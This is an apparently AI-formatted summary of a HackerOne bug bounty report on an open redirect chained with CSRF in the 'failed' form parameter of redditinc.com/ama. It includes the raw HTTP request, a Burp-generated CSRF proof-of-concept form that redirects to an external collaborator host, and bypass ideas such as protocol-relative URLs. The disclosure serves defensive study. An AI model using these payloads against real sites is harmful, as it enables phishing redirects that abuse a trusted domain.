# Open Redirect on www.redditinc.com via `failed` query parameter

## Metadata
- **Source:** HackerOne
- **Report:** 1257753 | https://hackerone.com/reports/1257753
- **Submitted:** 2021-07-12
- **Reporter:** lu3ky-13
- **Program:** Reddit Inc
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** Open Redirect, Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** uncategorised

## Summary
An open redirect vulnerability exists on redditinc.com/ama endpoint where the 'failed' POST parameter is not properly validated, allowing attackers to redirect users to arbitrary external URLs. The vulnerability can be exploited via CSRF to trick users into clicking a form that redirects them to a malicious site upon form submission failure.

## Attack scenario
1. Attacker crafts a malicious HTML page containing a CSRF form targeting redditinc.com/ama
2. The form includes a 'failed' parameter pointing to an attacker-controlled domain (e.g., http://xfs.bxss.me)
3. Attacker distributes the malicious page via phishing email or social engineering
4. Victim visits the malicious page while logged into Reddit or browsing normally
5. Form is auto-submitted or victim clicks submit button unknowingly
6. Upon form processing failure, victim is redirected to the attacker's malicious domain

## Root cause
The application fails to validate and sanitize the 'failed' POST parameter before using it in a redirect operation. The parameter is accepted as-is without checking if the URL belongs to the same domain or validating its format against a whitelist of allowed redirect destinations.

## Attacker mindset
An attacker exploits the lack of redirect validation to execute phishing attacks or credential harvesting by chaining CSRF with open redirect. By disguising a malicious redirect as part of a legitimate form submission process, the attack appears more trustworthy to victims since it originates from the legitimate redditinc.com domain.

## Defensive takeaways
- Implement strict whitelist validation for all redirect parameters - only allow relative URLs or URLs matching the application's domain
- Use URL parsing functions to extract and validate the host/domain component of redirect URLs
- Avoid using user-supplied data directly in Location headers; instead, maintain a server-side mapping of allowed redirect destinations
- Implement CSRF tokens and validate them properly on all state-changing operations, particularly form submissions
- Use Security headers like Content-Security-Policy to mitigate redirect-based attacks
- Validate all input parameters against expected formats and reject unexpected values
- Consider using relative paths for redirects when possible rather than absolute URLs

## Variant hunting
Search for other redirect parameters: 'return_url', 'return_to', 'next', 'goto', 'continue', 'redirect_to', 'success_url', 'error_url', 'callback'
Test other endpoints on redditinc.com and reddit.com that accept form submissions with redirect parameters
Check if 'success' parameter (also present in this form) has the same validation issue
Look for open redirects in authentication flows, password reset, and email verification endpoints
Test whether URL encoding or protocol-relative URLs (//attacker.com) bypass any existing filters
Check if double-encoding or HTML encoding bypasses validation logic

## MITRE ATT&CK
- T1566.002
- T1598.003
- T1056.004

## Notes
The report demonstrates both CSRF and open redirect vulnerabilities combined. The 'redirect' parameter in the form appears to contain an encoded hash, suggesting some validation attempts, but the 'failed' and 'success' parameters lack equivalent protection. The attacker's use of xfs.bxss.me and Burp Collaborator indicates standard reconnaissance methodology. This vulnerability could be chained with social engineering for credential theft or malware distribution.

## Full report
<details><summary>Expand</summary>

hello dear support

I have found the issue on https://www.redditinc.com/ama

HTTP request 

POST /ama HTTP/1.1
Content-Type: multipart/form-data; boundary=----------YWJkMTQzNDcw
Cookie: CRAFT_CSRF_TOKEN=958b77eaad06452d68f0be48c5edf5b0d928b51a6c4afbb5f2f95397f18b43e2a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22jZdkLxGgRNVPWIF2OyxH-Lig9pTukLSS8OxYOVST%22%3B%7D;OptanonAlertBoxClosed=2021-07-12T01:35:46.350Z;OptanonConsent=isIABGlobal=false&datestamp=Mon+Jul+12+2021+04%3A35%3A46+GMT%2B0300+(Arabian+Standard+Time)&version=6.13.0&hosts=&consentId=71f221d5-8a57-4a90-9844-0a863bfc837d&interactionCount=2&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 1508
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36
Host: www.redditinc.com
Connection: Keep-alive

------------YWJkMTQzNDcw
Content-Disposition: form-data; name="action"

zendesk/default/submit
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="agreement"

yes
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="description"

555
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="email"

sample@email.tst
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="email_confirm"

sample@email.tst
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="failed"

http://xfs.bxss.me
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="name"

pHqghUme
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="organization"

Acunetix
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="participants"

pHqghUme
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="redirect"

74bcbfb4f9c047fb4e467dd203ca3b30f2b31216551ab9db2bf44911c029d506thank-you/ama-form-step-1
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="subject"

AMA Request
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="success"

thank-you/ama-form-step-1
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="ticket_form_id"

360000307211
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="timeframe"

next-week
------------YWJkMTQzNDcw
Content-Disposition: form-data; name="timezone"

(GMT-05:00) Eastern Time (US & Canada)
------------YWJkMTQzNDcw--
===============================================================

vuln here :Content-Disposition: form-data; name="failed"

http://xfs.bxss.me
------------YWJkMTQzNDcw

CSRF PoC
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://www.redditinc.com/ama" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="action" value="zendesk&#47;default&#47;submit" />
      <input type="hidden" name="agreement" value="yes" />
      <input type="hidden" name="description" value="555" />
      <input type="hidden" name="email" value="sample&#64;email&#46;tst" />
      <input type="hidden" name="email&#95;confirm" value="sample&#64;email&#46;tst" />
      <input type="hidden" name="failed" value="http&#58;&#47;&#47;0bc7dpd4u9tmsh9ruo3n8644pvvlja&#46;burpcollaborator&#46;net" />
      <input type="hidden" name="name" value="pHqghUme" />
      <input type="hidden" name="organization" value="Acunetix" />
      <input type="hidden" name="participants" value="pHqghUme" />
      <input type="hidden" name="redirect" value="74bcbfb4f9c047fb4e467dd203ca3b30f2b31216551ab9db2bf44911c029d506thank&#45;you&#47;ama&#45;form&#45;step&#45;1" />
      <input type="hidden" name="subject" value="AMA&#32;Request" />
      <input type="hidden" name="success" value="thank&#45;you&#47;ama&#45;form&#45;step&#45;1" />
      <input type="hidden" name="ticket&#95;form&#95;id" value="360000307211" />
      <input type="hidden" name="timeframe" value="next&#45;week" />
      <input type="hidden" name="timezone" value="&#40;GMT&#45;05&#58;00&#41;&#32;Eastern&#32;Time&#32;&#40;US&#32;&amp;&#32;Canada&#41;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

{F1373178}

## Impact

Cross-Site Request Forgery (CSRF) To Open Redirect

</details>

---
*Analysed by Claude on 2026-05-24*
